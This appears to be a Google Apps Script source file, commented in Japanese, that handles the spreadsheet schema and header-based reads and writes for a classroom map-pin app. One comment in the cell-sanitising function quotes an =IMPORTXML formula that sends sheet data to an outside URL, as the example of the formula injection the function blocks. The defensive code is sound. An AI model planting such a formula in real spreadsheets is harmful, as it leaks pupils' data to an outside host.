/**
 * Db.gs — クラス DB スプレッドシートのスキーマとシート I/O
 *
 * 記録系シートの共通ルール:
 *   - 各行の ID（pin_id / chat_id / reaction_id）= recordId
 *   - email 列には「検証済みの email」だけを書く（クライアント申告は信用しない）
 *   - created_at はサーバー時刻
 *
 * 児童の個人設定は UserProperties に置けない（デプロイ S の実行者はアプリアカウントのため、
 * getUserProperties() は全児童で同一ストアになってしまう）。児童ごとの状態は
 * Members シート（email キー）に保存する。
 *
 * ── 読み書きは「列の位置」ではなく「見出しの名前」で行う ────────────────
 * コンテナバインドで配る形（スプレッドシートのコピーを先生に配り、そのファイルに
 * このスクリプトが束ねられている形）では、**先生がシートの列を触るのは事故ではなく
 * 起こる操作**である。列を 1 本挿されただけで、以前の実装は
 *   ・メモの中身が「なまえ」の列に入る
 *   ・is_active の列に日付が入り、単元が永久に切り替わらない
 *   ・email の列に表示名が入り、名簿照合が全員 NOT_MEMBER になる
 * といった壊れ方をした。しかも**画面には何も出ない**。
 *
 * そこで、読みも書きも 1 行目の見出しから引いた位置で行う（headerMap_）。
 * 見出しが見つからない列は「無い」として扱い、書こうとした場合は SHEET_BROKEN で
 * 止める（推測で N 列目に書かない）。点検と修整は Schema.gs にある。
 */

const TABLES = {
  // 旧版互換（legacy モードのみで使用）
  USERS: { name: 'Users_名簿', cols: ['email', 'name', 'group_id', 'role', 'created_at'] },

  // ── 管理シート（新規クラスで必ず作成）──
  MEMBERS: { name: 'Members', cols: ['email', 'displayName', 'role', 'status', 'number', 'groupId', 'joinedAt'] },
  SETTINGS: { name: 'Settings', cols: ['key', 'value'] },
  META: { name: '_Meta', cols: ['key', 'value'] },

  // ── アプリのデータシート ──
  UNITS: { name: 'Units_単元', cols: ['unit_id', 'name', 'maps_json', 'chat_enabled', 'stamp_enabled', 'custom_stamps', 'is_active', 'created_at'] },
  PINS: { name: 'Pins_ピン', cols: ['pin_id', 'unit_id', 'map_id', 'email', 'x', 'y', 'color', 'title', 'memo', 'image_url', 'created_at'] },
  CHATS: { name: 'Chats_チャット', cols: ['chat_id', 'unit_id', 'email', 'message', 'target_type', 'target_id', 'created_at'] },
  REACTIONS: { name: 'Reactions_反応', cols: ['reaction_id', 'unit_id', 'email', 'target_type', 'target_id', 'emoji', 'created_at'] },

  // 画像ストア: DriveApp を使わない（フル Drive スコープ回避）ため、
  // 圧縮済み Data URL を 40,000 文字ずつセル分割してシートに保存する
  IMAGES: { name: 'Images_画像', cols: ['image_id', 'owner_email', 'created_at', 'chunk_count', 'c1', 'c2', 'c3', 'c4', 'c5', 'c6', 'c7', 'c8', 'c9', 'c10'] }
};

// ────────────────────────────────────────────────────────────────
// 見出し（1 行目）から列を引く
// ────────────────────────────────────────────────────────────────

/**
 * 利用者が書いた文字列をセルに入れる前の無害化。
 *
 * 先頭が `= + - @` やタブ・改行だと、スプレッドシートはそれを**数式として実行**する。
 * 児童がピンの「なまえ」に `=IMPORTXML("http://…"&A2)` と書くと、
 * **先生がそのシートを開いた瞬間**に学級のデータが外部へ送られる。画面には何も出ない。
 * コンテナバインドで配る形では先生が必ずこのシートを開くので、通り道を 1 本にして全部通す。
 *
 * 先頭に `'` を足すと、シートは「文字列」として扱う。`getValue()` は `'` を返さないので、
 * アプリ側の読み出しは何も変わらない（保存 → 読み出しで元の文字に戻る）。
 */
function safeCellText_(v) {
  if (v === null || v === undefined) return '';
  if (typeof v !== 'string') return v;         // 数値・真偽値・Date はそのまま
  return /^[=+\-@\t\r\n]/.test(v) ? "'" + v : v;
}

/** 見出しセルの表記ゆれ（前後の空白・全角空白・改行）を吸収して比べるための正規化 */
function normalizeHeader_(v) {
  return String(v === null || v === undefined ? '' : v)
    .replace(/[　\s]+/g, '')
    .toLowerCase();
}

/**
 * 見出しの並び（1 行目の配列）から「列名 → 0 始まりの位置」を作る。
 * 見つからない列はキー自体を持たない（`H.memo === undefined` で「無い」が分かる）。
 * 同じ名前が 2 回出てきたら、左にあるほうを採る。
 */
function headerMapFromRow_(headerRow, table) {
  const row = headerRow || [];
  const norm = row.map(normalizeHeader_);
  const map = {};
  table.cols.forEach(function (name) {
    const at = norm.indexOf(normalizeHeader_(name));
    if (at >= 0) map[name] = at;
  });
  return map;
}

/** シートの 1 行目を読んで headerMapFromRow_ を作る（データを別に読まないとき用） */
function headerMap_(sheet, table) {
  const width = Math.max(sheet.getLastColumn(), 1);
  const row = sheet.getRange(1, 1, 1, width).getValues()[0];
  return headerMapFromRow_(row, table);
}

/**
 * 書き込みの前に「その列が本当にあるか」を確かめる。
 * 無ければ推測で N 列目に書かず、先生に何をすればよいかを言って止める。
 */
function requireCols_(H, table, names) {
  const missing = names.filter(function (n) { return H[n] === undefined; });
  if (missing.length) {
    throw new Error('SHEET_BROKEN: 「' + table.name + '」シートの見出しに「' + missing.join('」「') +
      '」が見つかりません。スプレッドシートのメニュー「みっけ！」＞「シートを点検する」で確かめてください');
  }
}

/**
 * 追記する 1 行を、そのシートの見出しの並びに合わせて組み立てる。
 * `values` に書いたキーは全部あることを要求する（黙って落とさない）。
 * 触れない列（先生が足したメモ欄など）は空のまま残す。
 */
function rowFor_(H, table, values, width) {
  const keys = Object.keys(values);
  requireCols_(H, table, keys);
  let last = 0;
  keys.forEach(function (k) { last = Math.max(last, H[k] + 1); });
  const len = Math.max(width || 0, last);
  const row = new Array(len).fill('');
  keys.forEach(function (k) { row[H[k]] = values[k]; });
  return row;
}

/** 既存の行の配列に、指定した列だけ上書きする（触れない列はそのまま残す） */
function setCells_(rowArray, H, table, values) {
  const keys = Object.keys(values);
  requireCols_(H, table, keys);
  keys.forEach(function (k) {
    while (rowArray.length <= H[k]) rowArray.push('');
    rowArray[H[k]] = values[k];
  });
  return rowArray;
}

/** 1 行の配列を、見出し名をキーにしたオブジェクトにする。無い列は '' */
function rowToObj_(rowArray, H, table) {
  const obj = {};
  table.cols.forEach(function (name) {
    const at = H[name];
    obj[name] = at === undefined ? '' : rowArray[at];
  });
  return obj;
}

// ────────────────────────────────────────────────────────────────
// シートの作成
// ────────────────────────────────────────────────────────────────

/**
 * シートが無ければ作る。**あるシートの見出しは書き換えない。**
 * （見出しがずれているとき、勝手に正しいラベルを付けると、間違った列に
 *   正しい名前が付いてしまい、そこから先は誰も気づけなくなる。修整は Schema.gs）
 */
function ensureSheet_(ss, table) {
  let sheet = ss.getSheetByName(table.name);
  if (!sheet) {
    sheet = ss.insertSheet(table.name);
    writeHeaderRow_(sheet, table);
  } else if (sheet.getLastRow() === 0) {
    // シートはあるが 1 行も無い（先生が中身を全部消した直後など）。見出しだけ戻す。
    writeHeaderRow_(sheet, table);
  }
  return sheet;
}

/** 空のシートに見出し行を書く。中身のあるシートには使わない */
function writeHeaderRow_(sheet, table) {
  sheet.appendRow(table.cols);
  sheet.setFrozenRows(1);
  sheet.getRange(1, 1, 1, table.cols.length)
    .setBackground('#41B3A3').setFontColor('white').setFontWeight('bold');
}

/** クラス DB として使うシートの一覧（旧 Users_名簿 は含めない） */
const CLASS_TABLE_KEYS = ['MEMBERS', 'SETTINGS', 'META', 'UNITS', 'PINS', 'CHATS', 'REACTIONS', 'IMAGES'];

/** 新規クラス DB の初期化。既定シートの掃除と全シート作成 */
function initializeNewDatabase_(ss) {
  CLASS_TABLE_KEYS.forEach(function (k) { ensureSheet_(ss, TABLES[k]); });
  // SpreadsheetApp.create 直後の既定シート（シート1等）を削除
  ss.getSheets().forEach(function (sh) {
    const names = CLASS_TABLE_KEYS.map(function (k) { return TABLES[k].name; });
    if (names.indexOf(sh.getName()) === -1 && ss.getSheets().length > 1) {
      try { ss.deleteSheet(sh); } catch (e) { /* 最後の1枚などは無視 */ }
    }
  });
}

/** 既存シートのクラス化（tpRegisterExisting）: 不足シートの補完と旧名簿の移行 */
function ensureClassSheets_(ss) {
  initializeNewDatabase_(ss);
  // 旧版の Users_名簿 があれば Members に移行（Members が空の場合のみ）
  const usersSheet = ss.getSheetByName(TABLES.USERS.name);
  const membersSheet = ss.getSheetByName(TABLES.MEMBERS.name);
  if (usersSheet && membersSheet.getLastRow() < 2 && usersSheet.getLastRow() >= 2) {
    const users = getTableData_(ss, TABLES.USERS);
    const H = headerMap_(membersSheet, TABLES.MEMBERS);
    const now = new Date();
    const out = users.filter(function (u) { return u.email; }).map(function (u) {
      return rowFor_(H, TABLES.MEMBERS, {
        email: String(u.email).toLowerCase().trim(),
        displayName: safeCellText_(u.name || ''),
        role: u.role === 'teacher' ? 'teacher' : 'student',
        status: 'active',
        number: '',
        groupId: safeCellText_(u.group_id || ''),
        joinedAt: now
      }, TABLES.MEMBERS.cols.length);
    });
    if (out.length) membersSheet.getRange(2, 1, out.length, out[0].length).setValues(out);
  }
}

// ────────────────────────────────────────────────────────────────
// key/value シート（_Meta / Settings）
// ────────────────────────────────────────────────────────────────

function putKeyValue_(ss, table, key, value) {
  const sheet = ensureSheet_(ss, table);
  const data = sheet.getDataRange().getValues();
  const H = headerMapFromRow_(data[0], table);
  requireCols_(H, table, ['key', 'value']);
  for (let i = 1; i < data.length; i++) {
    if (data[i][H.key] === key) { sheet.getRange(i + 1, H.value + 1).setValue(value); return; }
  }
  sheet.appendRow(rowFor_(H, table, { key: key, value: value }, data[0].length));
}

function getKeyValue_(ss, table, key) {
  const sheet = ensureSheet_(ss, table);
  const data = sheet.getDataRange().getValues();
  const H = headerMapFromRow_(data[0], table);
  if (H.key === undefined || H.value === undefined) return '';
  for (let i = 1; i < data.length; i++) {
    if (data[i][H.key] === key) return data[i][H.value];
  }
  return '';
}

function setMeta_(ss, key, value) {
  putKeyValue_(ss, TABLES.META, key, value);
}

function writeMeta_(ss, meta) {
  Object.keys(meta).forEach(function (k) { setMeta_(ss, k, meta[k]); });
}

function getSettingValue_(ss, key) {
  return getKeyValue_(ss, TABLES.SETTINGS, key);
}

/** Settings はクラス共通設定（教員のみ書き込み可。サーバー側で強制 — 教員 API 経由のみ呼ぶ） */
function setSettingValue_(ss, key, value) {
  putKeyValue_(ss, TABLES.SETTINGS, key, safeCellText_(value));
}

// ────────────────────────────────────────────────────────────────
// 表の読み書き
// ────────────────────────────────────────────────────────────────

/** シートを行オブジェクト配列として読む（読みは getValues 1 回。列は見出し名で解決） */
function getTableData_(ss, table) {
  const sheet = ensureSheet_(ss, table);
  const lastRow = sheet.getLastRow();
  const lastCol = Math.max(sheet.getLastColumn(), 1);
  if (lastRow < 2) return [];
  const values = sheet.getRange(1, 1, lastRow, lastCol).getValues();
  const H = headerMapFromRow_(values[0], table);
  return values.slice(1).map(function (row) { return rowToObj_(row, H, table); });
}

/**
 * 追記の同時書き込み対策。
 * デプロイ S は全児童が同一実行者（アプリアカウント）なので、ScriptLock は
 * 全クラス横断の直列化になる。ロック保持区間は「appendRow 1 回」程度に最小化し、
 * トークン検証や読み取りはロック外で行うこと。
 * 取得失敗は LOCK_BUSY とし、フロント側で指数バックオフ 3 回の自動リトライを行う。
 */
function withScriptLock_(fn) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(CONFIG.LOCK_TIMEOUT_MS)) {
    throw new Error('LOCK_BUSY: 混み合っています。数秒待ってもう一度お試しください');
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

/**
 * 1 行の追記。`values` は列名をキーにしたオブジェクトで渡す。
 * 位置ではなくシートの見出しに合わせて並べ替えるので、先生が列を足していても
 * 正しい列に入る。無い列に書こうとした場合は SHEET_BROKEN で止まる。
 */
function appendRowLocked_(ss, table, values) {
  // 見出しの読み取りと行の組み立ては**ロックの外**でやる。
  // ロックの中に入れると、40 台が一斉に送信したとき 1 件あたりの保持時間が
  // 2 倍近くになり、後ろの数人だけが黙って落ちる。握るのは appendRow 1 回だけ。
  const sheet = ensureSheet_(ss, table);
  const H = headerMap_(sheet, table);
  const row = rowFor_(H, table, values, sheet.getLastColumn());
  withScriptLock_(function () { sheet.appendRow(row); });
}

// ────────────────────────────────────────────────────────────────
// 画像ストア（Images_画像シート）
// ────────────────────────────────────────────────────────────────

function isValidImageRef_(ref) {
  return typeof ref === 'string' && /^imgref:[A-Za-z0-9\-_]{8,64}$/.test(ref);
}

/** 圧縮済み Data URL を保存し 'imgref:<id>' を返す。ownerEmail は検証済みメールのみ渡すこと */
function storeImage_(ss, ownerEmail, dataUrl) {
  if (typeof dataUrl !== 'string' || !/^data:image\/(jpeg|png|webp);base64,[A-Za-z0-9+\/=]+$/.test(dataUrl)) {
    throw new Error('BAD_INPUT: 画像データの形式が正しくありません');
  }
  if (dataUrl.length > CONFIG.MAX_IMAGE_DATAURL_CHARS) {
    throw new Error('BAD_INPUT: 画像が大きすぎます。小さい写真でもう一度お試しください');
  }
  const id = Utilities.getUuid().replace(/-/g, '');
  const chunks = [];
  for (let i = 0; i < dataUrl.length; i += CONFIG.IMAGE_CHUNK_CHARS) {
    chunks.push(dataUrl.slice(i, i + CONFIG.IMAGE_CHUNK_CHARS));
  }
  if (chunks.length > 10) {
    throw new Error('BAD_INPUT: 画像が大きすぎます。小さい写真でもう一度お試しください');
  }
  const values = { image_id: id, owner_email: ownerEmail, created_at: new Date(), chunk_count: chunks.length };
  for (let i = 0; i < 10; i++) values['c' + (i + 1)] = chunks[i] || '';
  appendRowLocked_(ss, TABLES.IMAGES, values);
  return 'imgref:' + id;
}

/** 'imgref:<id>' から Data URL を復元。見つからなければ '' */
function loadImage_(ss, ref) {
  if (!isValidImageRef_(ref)) return '';
  const id = ref.slice('imgref:'.length);
  const rows = getTableData_(ss, TABLES.IMAGES);
  for (let i = 0; i < rows.length; i++) {
    if (String(rows[i].image_id) === id) {
      const count = Math.min(Number(rows[i].chunk_count) || 0, 10);
      let out = '';
      for (let c = 1; c <= count; c++) out += String(rows[i]['c' + c] || '');
      return out;
    }
  }
  return '';
}
